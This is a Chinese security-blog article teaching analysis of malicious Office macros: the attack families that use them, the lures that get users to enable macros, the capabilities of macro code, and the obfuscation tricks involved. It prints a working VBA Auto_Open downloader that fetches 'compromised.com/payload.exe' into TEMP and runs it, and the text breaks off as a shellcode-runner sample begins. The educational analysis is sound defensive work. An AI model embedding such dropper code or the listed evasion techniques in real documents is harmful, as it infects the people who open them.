<html>
<head>
<title>干货恶意代码分析之Office宏代码分析</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货 | 恶意代码分析之Office宏代码分析
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    doash123
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-01-05</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="text-align: center;" data-mpa-powered-by="yiban.io"><img class="rich_pages" data-ratio="0.5029325513196481" data-s="300,640" data-type="png" data-w="682" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/1_3mv9VPjC1aon24oDjUibXSBjjorFAQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibmOcYOjlLiacPzWsIttAAMllYDS3mv9VPjC1aon24oDjUibXSBjjorFAQ/640?wx_fmt=png'" style=""  /></p><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">&nbsp;</span></section><section data-tools="新媒体排版" data-id="13745" data-style-type="标题"><section data-tools="新媒体管家" style="width: fit-content;visibility: visible;max-width: 100%;"><section style="display: flex;justify-content: center;margin: 0px 16px;visibility: visible;max-width: 100%;"><section data-darkmode-bgimage="1" data-darkmode-bgimage-15933958453571="1" data-darkmode-color="rgba(0,0,0,0.9)" data-darkmode-color-15933958453571="#191919" data-style="width: 63px; height: 24px; background-image: url(&quot;https://static.xmt.cn/img/08213e0d39b942e78aea5e14f79271c4.png&quot;); background-size: contain; background-position: center center; transform: translateY(2px); visibility: visible;" style="width: 63px;height: 24px;background-image: url(&quot;https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPiblKcBL4WXNMFxZpdoW1ubgIvObsmLSy3XnbElbHqFibzvKSDiauWbfyQA/640?wx_fmt=png&quot;);background-size: contain;background-position: center center;transform: translateY(2px);visibility: visible;max-width: 100%;"><br data-darkmode-bgimage-15933958453571="1" data-darkmode-color-15933958453571="#191919" style="visibility: visible;" data-darkmode-bgimage="1" data-darkmode-color="rgba(0,0,0,0.9)"  /><br style="display:none;"  /></section><section style="display: flex;align-items: flex-end;font-size:16px;line-height:36px;;font-weight: 700;color: rgb(182, 0, 0);letter-spacing: 1.78px;text-align: center;line-height: 22px;font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif;margin: 0px 12px;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-style="display: flex; align-items: flex-end; font-size:16px;line-height:36px;; font-weight: 700; color: rgb(182, 0, 0); letter-spacing: 1.78px; text-align: center; line-height: 22px; font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif; margin: 0px 12px; visibility: visible;" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)"><section style="min-width: 16px;white-space: nowrap;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)">0x00 前言</section></section></section></section></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">在之前的文章中，讲述了几个常见的恶意样本的一些常规分析手法。主要使用的工具有exeinfo(查壳)、IDA(静态分析)、od&amp;xdbg32(动态调试)、Systrace&amp;火绒剑(行为分析)等。从本小节开始，文章将讲述不同种类的非PE样本和一些更复杂的PE样本如何调试和分析。关于非PE样本的概述，在之前的文章中已经进行了概要的介绍，目前来讲，非PE样本在攻击链中往往属于重要的部分。在本节中，笔者将详细介绍关于office宏类的非PE样本的分析方法。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">&nbsp;</span></section><section data-tools="新媒体排版" data-id="13745" data-style-type="标题"><section data-tools="新媒体管家" style="width: fit-content;visibility: visible;max-width: 100%;"><section style="display: flex;justify-content: center;margin: 0px 16px;visibility: visible;max-width: 100%;"><section data-darkmode-bgimage="1" data-darkmode-bgimage-15933958453571="1" data-darkmode-color="rgba(0,0,0,0.9)" data-darkmode-color-15933958453571="#191919" data-style="width: 63px; height: 24px; background-image: url(&quot;https://static.xmt.cn/img/08213e0d39b942e78aea5e14f79271c4.png&quot;); background-size: contain; background-position: center center; transform: translateY(2px); visibility: visible;" style="width: 63px;height: 24px;background-image: url(&quot;https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPiblKcBL4WXNMFxZpdoW1ubgIvObsmLSy3XnbElbHqFibzvKSDiauWbfyQA/640?wx_fmt=png&quot;);background-size: contain;background-position: center center;transform: translateY(2px);visibility: visible;max-width: 100%;"><br data-darkmode-bgimage-15933958453571="1" data-darkmode-color-15933958453571="#191919" style="visibility: visible;" data-darkmode-bgimage="1" data-darkmode-color="rgba(0,0,0,0.9)"  /><br style="display:none;"  /></section><section style="display: flex;align-items: flex-end;font-size:16px;line-height:36px;;font-weight: 700;color: rgb(182, 0, 0);letter-spacing: 1.78px;text-align: center;line-height: 22px;font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif;margin: 0px 12px;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-style="display: flex; align-items: flex-end; font-size:16px;line-height:36px;; font-weight: 700; color: rgb(182, 0, 0); letter-spacing: 1.78px; text-align: center; line-height: 22px; font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif; margin: 0px 12px; visibility: visible;" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)"><section style="min-width: 16px;white-space: nowrap;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)">0x01 Office宏简介</section></section></section></section></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">该部分的主要内容来源于19年年底我看到的一个英文论文，原文链接暂时找不到了，后续如果找到了我会贴在评论中。</span></section><p><br  /></p><h3 name="h3-2" style="box-sizing: border-box;margin: 5px 16px 0.5rem;font family: inherit;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">基于宏的攻击活动</span></h3><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">目前利用office宏进行攻击应该是一个比较主流的攻击方式了，但是通常情况下，宏代码并不能很好地实现所有的功能，更多的时候，宏代码都是作为一个加载器或者下载器载攻击中发挥作用的。<br style="box-sizing: border-box;"  />有时候，宏代码会直接访问攻击者的C2，下载恶意文件到本地运行。<br style="box-sizing: border-box;"  />有时候，宏代码会解密释放出一个powershell代码，再调用powershell脚本，通过powershell脚本去实现环境检测、文件下载等功能。<br style="box-sizing: border-box;"  />宏代码基于的是VB的语法，如果没有混淆的宏代码阅读起来倒是比较方便，但是现在的大多数宏样本都会有混淆和一些反调试手法，所以在遇到各类宏代码的时候也要根据情况去分析。</span></section><p><br  /></p><h3 name="h3-3" style="box-sizing: border-box;margin: 5px 16px 0.5rem;font family: inherit;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">一些钟爱office宏攻击的家族</span></h3><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="box-sizing: border-box;font-weight: bolder;font-size:15px;line-height:35px;;">Emotet</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">Emotet是一个专注于银行攻击的木马家族，该家族从2014年活跃至今，别是在2019年，每天Emotet都会在全球发送超过十万封钓鱼邮件进行攻击。关于Emotet，是目前比较活跃的银行木马，该组织的攻击样本也比较有特色，之后有机会写一篇文章对该家族的样本进行一个完整的分析。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="box-sizing: border-box;font-weight: bolder;font-size:15px;line-height:35px;;">FTCODE</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">一款由宏作为载体，释放powershell实现的勒索软件，活跃至2019年。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="box-sizing: border-box;font-weight: bolder;font-size:15px;line-height:35px;;">Sandworm: BlackEnergy / Olympic Destroyer</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">sandworm每次攻击的起始都是宏<br style="box-sizing: border-box;"  />2015年和2016年两次袭击乌克兰发电厂，导致停电。2018年攻击平昌冬奥会。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="box-sizing: border-box;font-weight: bolder;font-size:15px;line-height:35px;;">Other</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">除此之外，还有像Dridex、Rovnix、Vawtrak、FIN4、Locky、APT32、TA505、Hancitor、Trickbot、FIN7、Buran、 Ursni、Gozi,、Dreambot、 TA2101/Maze ransomware、 等家族，都会在攻击过程中使用到带有恶意宏代码的office文档。</span></section><p><br  /></p><h3 name="h3-4" style="box-sizing: border-box;margin: 5px 16px 0.5rem;font family: inherit;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">恶意宏如何运行</span></h3><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">先来看一个典型的宏利用文档打开的提示：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.5411203814064363" data-type="png" data-w="839" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/2_R4TGFFicg7Ndb3JD5QBGcrPlOBZbdA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibvg10ibUIFU80QiaQiawM2LgKts1UR4TGFFicg7Ndb3JD5QBGcrPlOBZbdA/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">由于宏的危险性，office通常情况下默认是禁用宏执行的，所以当带有宏的文件打开，就会询问用户是否开启宏，为了让用户在不知情的情况下启用宏，攻击者也是想了很多方式，我大概遇见过这么几种：<br style="box-sizing: border-box;"  />1.在文档中间显示一个模糊的图片，提示用户启用宏才能查看清晰图片。<br style="box-sizing: border-box;"  />2.在文档中伪造安全的机构，比如伪造微软，或者伪造一个杀软的图标，让用户相信这个文档是安全的。<br style="box-sizing: border-box;"  />3.与用户交互，把宏代码的执行设置在用户单击了某个图片或者按钮则提示用户启用宏。</span></section><p><br  /></p><h3 name="h3-5" style="box-sizing: border-box;margin: 5px 16px 0.5rem;font family: inherit;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">恶意宏代码通常被用来做什么</span></h3><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">一般来讲，恶意宏代码可以实现以下操作：<br style="box-sizing: border-box;"  />Run Automatically 自动运行<br style="box-sizing: border-box;"  />Download Files 下载文件<br style="box-sizing: border-box;"  />CreateFiles 创建文件<br style="box-sizing: border-box;"  />Execute a file 执行、启动文件<br style="box-sizing: border-box;"  />Run a system command 执行系统命令<br style="box-sizing: border-box;"  />call any dll 调用任意dll<br style="box-sizing: border-box;"  />Inject Shellcode 注入shellcode<br style="box-sizing: border-box;"  />Call any ActiveXObkject 调用任意的ActiveXObject<br style="box-sizing: border-box;"  />Simulate Keystrokes 模拟用户点击<br style="box-sizing: border-box;"  />…</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">需要注意的是，一个恶意程序可能完全由宏实现，但是更多的情况下，宏用于加载或者下载其他恶意程序。所以对于一个未知的office文档来讲，启用office的宏和打开未知的exe文件一样危险：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.09966777408637874" data-type="png" data-w="903" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/3_JiapdEUpejDANACaFlU8x3UHQZpYGQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPib2qtqOaMDKEwBjkzDhtiaqibQ772JiapdEUpejDANACaFlU8x3UHQZpYGQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">一个简单的VBA Downloader（下载者），有时候也称为Dropper（加载器）示例：</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">private  <span class="code-snippet__keyword">Declare</span> <span class="code-snippet__keyword">Function</span> URLDownloadToFileA Lib <span class="code-snippet__string">"urlmon"</span></span></code><code><span class="code-snippet_outer">(ByVak A <span class="code-snippet__keyword">AS</span> <span class="code-snippet__keyword">Long</span>,ByVal B <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">String</span> ,</span></code><code><span class="code-snippet_outer">ByVal C <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">String</span> ,ByVal D <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span> ,</span></code><code><span class="code-snippet_outer">ByVal E <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span> ) <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">Sub Auto_Open()</span></code><code><span class="code-snippet_outer">    Dim <span class="code-snippet__keyword">result</span> <span class="code-snippet__keyword">As</span> <span class="code-snippet__keyword">Long</span></span></code><code><span class="code-snippet_outer">    fname = Environ(<span class="code-snippet__string">"TEMP"</span>) &amp; <span class="code-snippet__string">"agent.exe"</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">result</span> =URLDownloadToFileA(<span class="code-snippet__number">0</span>,<span class="code-snippet__string">"http:compromised.com/payload.exe"</span>,fname,<span class="code-snippet__number">0</span>,<span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer">    Shell fname</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">End</span> Sub</span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">这里使用的URLDownloadToFileA来自于系统dll urlmon.dll<br style="box-sizing: border-box;"  />在第六行定义了名为Auto_Open的函数，该函数在文档打开的时候会自动运行（如果允许文档执行宏）<br style="box-sizing: border-box;"  />第八行滴位置，指明了下载文件的存放路径和名称<br style="box-sizing: border-box;"  />第9行的地方调用了URLDownloadToFileA函数，下载文件保存到本地<br style="box-sizing: border-box;"  />第10行的位置执行下载的payload</span></section><p><br  /></p><h3 name="h3-6" style="box-sizing: border-box;margin: 5px 16px 0.5rem;font family: inherit;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">简单的混淆、反调试技术</span></h3><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">1.利用ActiveX触发器<br style="box-sizing: border-box;"  />一个典型的例子：</span><span style="font-size:15px;line-height:35px;;">利用InkPicture1_Painted</span><br style="box-sizing: border-box;"  /><span style="font-size:15px;line-height:35px;;">2.隐藏数据<br style="box-sizing: border-box;"  />3.用于隐藏数据的Word文档变量，文档变量可以存储多达64KB的数据，隐藏在MS Word用户界面中。<br style="box-sizing: border-box;"  />4.通过CallByName混淆函数调用<br style="box-sizing: border-box;"  /></span><span style="font-size:15px;line-height:35px;;">https://msdn.microsoft.com/en-us/library/office/gg278760.aspx</span><br style="box-sizing: border-box;"  /><span style="font-size:15px;line-height:35px;;">5.使用WMI运行命令<br style="box-sizing: border-box;"  />6.调用powershell<br style="box-sizing: border-box;"  />7.运行VBScript或者Jscript，运行VBS/JS代码而不将文件写入磁盘<br style="box-sizing: border-box;"  />可参考文档：</span><span style="font-size:15px;line-height:35px;;">https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-6.0/aa227637(v=vs.60)?redirectedfrom=MSDN</span><br style="box-sizing: border-box;"  /><span style="font-size:15px;line-height:35px;;">代码示例：</span><span style="font-size:15px;line-height:35px;;">https://www.experts-exchange.com/questions/28190006/VBA-ScriptControl-to-run-Java-Script-Function.html</span><br style="box-sizing: border-box;"  /><span style="font-size:15px;line-height:35px;;">8.通过API回调运行shellcode</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">一例通过VBA运行shellcode的实例：</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index 